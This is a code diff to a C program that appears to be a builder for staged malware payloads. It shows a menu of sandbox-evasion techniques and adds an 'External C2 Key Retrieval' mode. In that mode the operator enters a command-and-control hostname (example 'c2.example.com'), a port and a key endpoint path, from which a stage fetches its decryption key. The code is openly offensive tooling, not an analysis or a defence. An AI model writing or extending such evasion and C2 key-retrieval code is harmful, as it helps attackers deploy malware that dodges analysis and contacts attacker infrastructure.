@@ -63,8 +63,9 @@ static int select_evasion_technique(void) {
                 printf("    5) External NTP Sync Check    (ID: 205)\n");
                 printf("    6) Network Garbage Flood      (ID: 206)\n");
                 printf("    7) Reverse DNS Resolution     (ID: 207)\n");
+                printf("    8) External C2 Key Retrieval  (ID: 208)\n");
                 printf("    Selection: ");
-                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
+                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 8) {
                     tech_id = 200 + tech_choice;
                 }
                 break;
@@ -173,6 +174,7 @@ int main(void) {
     for (int i = 0; i < total_stages; i++) {
         strncpy(stages[i].net_ip, "127.0.0.1", sizeof(stages[i].net_ip));
         strncpy(stages[i].net_host, "localhost", sizeof(stages[i].net_host));
+        strncpy(stages[i].net_path, "/", sizeof(stages[i].net_path));
         stages[i].net_port = 80;
 
         printf("\n-----------------------------------------------------\n");
@@ -194,11 +196,29 @@ int main(void) {
         stages[i].tech_id = select_evasion_technique();
 
         if (stages[i].tech_id == 108) {
+            // --- PROOF OF WORK MODE ---
             stages[i].key_derivation_mode = 2;
             printf("Enter PoW Difficulty bits: ");
             scanf("%d", &stages[i].pow_difficulty);
             stages[i].tech_param = stages[i].pow_difficulty;
+
+        } else if (stages[i].tech_id == 208) {
+            // --- EXTERNAL C2 KEY RETRIEVAL MODE ---
+            stages[i].key_derivation_mode = 3;
+            stages[i].pow_difficulty = 0;
+            stages[i].tech_param = 0; // No time parameter required; waiting loop is governed by network response
+
+            printf("[NETWORK C2] Enter C2 Hostname/Domain/IP (e.g., c2.example.com): ");
+            scanf("%127s", stages[i].net_host);
+
+            printf("[NETWORK C2] Enter C2 Port (e.g., 80, 8080 or 443): ");
+            scanf("%d", &stages[i].net_port);
+
+            printf("[NETWORK C2] Enter Key Endpoint URI Path (e.g., /api/v1/get_key): ");
+            scanf("%63s", stages[i].net_path);
+
         } else {
+            // --- STANDARD / LOCAL STATIC DERIVATION MODE ---
             stages[i].key_derivation_mode = 1;
             stages[i].pow_difficulty = 0;
 
